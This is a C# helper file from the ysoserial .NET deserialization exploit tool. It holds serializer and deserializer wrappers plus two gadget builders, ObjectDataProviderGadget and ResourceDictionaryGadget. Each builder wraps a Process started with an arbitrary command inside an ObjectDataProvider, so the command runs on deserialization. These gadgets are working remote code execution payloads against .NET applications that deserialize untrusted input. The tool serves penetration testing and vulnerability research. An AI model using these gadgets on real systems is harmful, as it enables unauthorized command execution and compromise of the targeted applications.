using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Text;
using System.Windows;
using System.Windows.Data;
using System.Windows.Markup;
using System.Xml;
using System.Xml.Serialization;

namespace ysoserial.Helpers.DevTest
{
    class SerializersHelper
    {
        public static void ShowAll(object myobj)
        {
            ShowAll(myobj, myobj.GetType());
        }

        public static void ShowAll(object myobj, Type type)
        {
            try
            {
                Console.WriteLine("\n~~XmlSerializer:~~\n");
                MyXmlSerializer(myobj, myobj.GetType());
            }
            catch (Exception e)
            {
                Console.WriteLine("\tError in XmlSerializer!");
            }

            try
            {
                Console.WriteLine("\n~~DataContractSerializer:~~\n");
                MyDataContractSerializer(myobj, myobj.GetType());
            }
            catch (Exception e)
            {
                Console.WriteLine("\tError in DataContractSerializer!");
            }

            try
            {
                Console.WriteLine("\n~~Xaml:~~\n");
                MyXamlSerializer(myobj);
            }
            catch (Exception e)
            {
                Console.WriteLine("\tError in Xaml!");
            }


            try
            {
                Console.WriteLine("\n~~NetDataContractSerializer:~~\n");
                MyNetDataContractSerializer(myobj);
            }
            catch (Exception e)
            {
                Console.WriteLine("\tError in NetDataContractSerializer!");
            }


        }


        public static void MyXmlSerializer(object myobj)
        {
            MyXmlSerializer(myobj, myobj.GetType());
        }

        public static void MyXmlSerializer(object myobj, Type type)
        {
            XmlSerializer xmlSerializer = new XmlSerializer(type);

            TextWriter stringWriter = new StringWriter(CultureInfo.InvariantCulture);
            xmlSerializer.Serialize(stringWriter, myobj);
            string text = stringWriter.ToString();
            stringWriter.Close();
            Console.WriteLine(text);
        }

        public static void MyDataContractSerializer(object myobj)
        {
            MyDataContractSerializer(myobj, myobj.GetType());
        }

        public static void MyDataContractSerializer(object myobj, Type type)
        {
            XmlWriterSettings settings = new XmlWriterSettings();
            settings.Indent = true;
            using (XmlWriter writer = XmlWriter.Create("test.xml", settings))
            {
                DataContractSerializer ser = new DataContractSerializer(type);
                ser.WriteObject(writer, myobj);
            }
            string text = File.ReadAllText("test.xml");
            Console.WriteLine(text);
        }

        public static void MyXamlSerializer(object myobj)
        {
            XmlWriterSettings settings = new XmlWriterSettings();
            settings.Indent = true;
            using (XmlWriter writer = XmlWriter.Create("test.xaml", settings))
            {
                System.Windows.Markup.XamlWriter.Save(myobj, writer);
            }
            string text = File.ReadAllText("test.xaml");
            Console.WriteLine(text);
        }

        public static void MyNetDataContractSerializer(object myobj)
        {
            XmlWriterSettings settings = new XmlWriterSettings();
            settings.Indent = true;
            using (XmlWriter writer = XmlWriter.Create("testnetdata.xml", settings))
            {
                NetDataContractSerializer ser = new NetDataContractSerializer();
                ser.WriteObject(writer, myobj);
            }
            string text = File.ReadAllText("testnetdata.xml");
            Console.WriteLine(text);
        }

        public static object MyXamlDeserializer(string str)
        {
            object obj = XamlReader.Load(new XmlTextReader(new StringReader(str)));
            return obj;
        }

        public static object MyDataContractDeserializer(string str, string type)
        {
            var s = new DataContractSerializer(Type.GetType(type));

            object obj = s.ReadObject(new XmlTextReader(new StringReader(str)));
            return obj;
        }

        public static object MyDataContractDeserializer(string str, Type type)
        {
            var s = new DataContractSerializer(type);
            object obj = s.ReadObject(new XmlTextReader(new StringReader(str)));
            return obj;
        }

        public static object MyNetDataContractDeserializer(string str)
        {
            var s = new NetDataContractSerializer();
            byte[] serializedData = Encoding.UTF8.GetBytes(str);
            MemoryStream ms = new MemoryStream(serializedData);
            object obj = s.Deserialize(ms);
            return obj;
        }

        public static object MyXMLDeserializer(string str, string type)
        {
            var s = new XmlSerializer(Type.GetType(type));
            object obj = s.Deserialize(new XmlTextReader(new StringReader(str)));
            return obj;
        }

        public static object MyXMLDeserializer(string str, Type type)
        {
            var s = new XmlSerializer(type);
            object obj = s.Deserialize(new XmlTextReader(new StringReader(str)));
            return obj;
        }

        public static object ObjectDataProviderGadget(string cmd)
        {
            ProcessStartInfo psi = new ProcessStartInfo();

            Boolean hasArgs;
            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, out hasArgs);
            psi.FileName = splittedCMD[0];
            if (hasArgs)
            {
                psi.Arguments = splittedCMD[1];
            }

            StringDictionary dict = new StringDictionary();
            psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
            Process p = new Process();
            p.StartInfo = psi;
            ObjectDataProvider odp = new ObjectDataProvider();
            odp.MethodName = "Start";
            odp.IsInitialLoadEnabled = false;
            odp.ObjectInstance = p;
            return odp;
        }

        public static object ResourceDictionaryGadget(string cmd)
        {
            ProcessStartInfo psi = new ProcessStartInfo();

            Boolean hasArgs;
            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, out hasArgs);
            psi.FileName = splittedCMD[0];
            if (hasArgs)
            {
                psi.Arguments = splittedCMD[1];
            }

            StringDictionary dict = new StringDictionary();
            psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
            Process p = new Process();
            p.StartInfo = psi;
            ObjectDataProvider odp = new ObjectDataProvider();
            odp.MethodName = "Start";
            odp.IsInitialLoadEnabled = false;
            odp.ObjectInstance = p;
            ResourceDictionary myResourceDictionary = new ResourceDictionary();
            myResourceDictionary.Add("odp", odp);
            return myResourceDictionary;
        }
    }
}
